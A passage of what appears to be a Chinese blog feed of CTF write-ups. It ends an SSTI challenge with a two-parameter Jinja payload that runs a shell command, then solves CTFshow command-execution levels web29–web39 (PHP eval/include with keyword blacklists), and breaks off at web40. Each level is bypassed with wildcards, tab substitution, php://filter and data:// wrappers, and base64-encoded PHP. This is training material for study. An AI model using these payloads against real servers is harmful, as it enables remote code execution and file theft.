punctuation">&gt;</span></span><span class="token comment">&lt;!-- /source --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问获得 waf</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">is_hacker</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token triple-quoted-string string">"""整那些个花里胡哨的waf有啥用，还不如这一个，直接杜绝SSTI"""</span> <span class="token keyword">if</span> <span class="token string">"{"</span> <span class="token keyword">in</span> string <span class="token keyword">and</span> <span class="token string">"}"</span> <span class="token keyword">in</span> string <span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存在 SSTI</p><ol start="3"><li>题解</li></ol><p>构造 payload</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">/result?boy_name=boy&amp;girl_name=girl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020220606195947.png"></p><p>存在回显，但是由于 waf 的存在不能在同一个字段中进行 SSTI，可能可以通过两个参数拼接</p><p>构造 payload</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">/result?boy_name={{'&amp;girl_name='.__class__.__bases__[0].__subclasses__()[81].__init__.__globals__.__builtins__.eval('__import__("os").popen("id").read()')}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020220606201126.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF 秀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF 秀 - 命令执行</title>
      <link href="/2023/01/21/catchtheflag/ctf-xiu/ctf-xiu-ming-ling-zhi-xing/"/>
      <url>/2023/01/21/catchtheflag/ctf-xiu/ctf-xiu-ming-ling-zhi-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-秀-命令执行"><a href="#CTF-秀-命令执行" class="headerlink" title="CTF 秀 - 命令执行"></a>CTF 秀 - 命令执行</h1><h2 id="1-web29"><a href="#1-web29" class="headerlink" title="1. web29"></a>1. web29</h2><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过 GET 方式传入参数，使用 eval 进行命令执行</p><p>过滤掉关键字于是使用通配符进行文件读取</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-web30"><a href="#2-web30" class="headerlink" title="2. web30"></a>2. web30</h2><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤掉了 system，可使用 exec 进行替换</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 拼接字符串</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac fl'</span><span class="token operator">.</span><span class="token string single-quoted-string">'ag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"fl"</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string double-quoted-string">"ag.php"</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`tac $c`</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ZmxhZy5waHA="</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tac <span class="token interpolation"><span class="token variable">$a</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 使用通配符</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac fl*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac fl?g.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac fl[a]g.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac fl[a~z]g.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment"># [] 中可以用 ~ 连接起来一个范围</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-web31"><a href="#3-web31" class="headerlink" title="3. web31"></a>3. web31</h2><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 %09 替换空格</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">echo</span><span class="token operator">%</span><span class="token number">09</span><span class="token string backtick-quoted-string">`tac%09f*`</span><span class="token punctuation">;</span><span class="token comment"># 远程传参</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>flag<span class="token operator">.</span>php<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">pos</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-web32"><a href="#4-web32" class="headerlink" title="4. web32"></a>4. web32</h2><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤掉了括号，include 可以不通过括号包含文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">?c=include"$_GET[0]"?&gt;&amp;0=data://text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string backtick-quoted-string">`tac flag.php`</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>?c=include"$_GET[0]"?&gt;&amp;0=php://filter/convert.base64-encode/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="5-web33"><a href="#5-web33" class="headerlink" title="5. web33"></a>5. web33</h2><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没啥影响</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">?</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span><span class="token number">0</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6-web34"><a href="#6-web34" class="headerlink" title="6. web34"></a>6. web34</h2><p>源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没啥影响</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">?</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span><span class="token number">0</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="7-web35"><a href="#7-web35" class="headerlink" title="7. web35"></a>7. web35</h2><p>源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\&lt;|\=/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没啥影响</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">?</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span><span class="token number">0</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="8-web36"><a href="#8-web36" class="headerlink" title="8. web36"></a>8. web36</h2><p>源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\&lt;|\=|\/|[0-9]/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤掉了数字，将参数名修改为字母</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">?</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="9-web37"><a href="#9-web37" class="headerlink" title="9. web37"></a>9. web37</h2><p>源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag in flag.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 data:// 传入数据执行命令</p><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain;base64,PD9waHAgaGlnaGxpZ2h0X2ZpbGUoJ2ZsYWcucGhwJyk/Pg==</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="10-web38"><a href="#10-web38" class="headerlink" title="10. web38"></a>10. web38</h2><p>源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag in flag.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|php|file/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用上面一题的 payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain;base64,PD9waHAgaGlnaGxpZ2h0X2ZpbGUoJ2ZsYWcucGhwJyk/Pg==</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="11-web39"><a href="#11-web39" class="headerlink" title="11. web39"></a>11. web39</h2><p>源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag in flag.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>限制了后缀，但是使用 data 协议已经闭合掉，不影响命令执行<br>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">?c=data://text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tac f*"</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="12-web40"><a href="#12-web40" 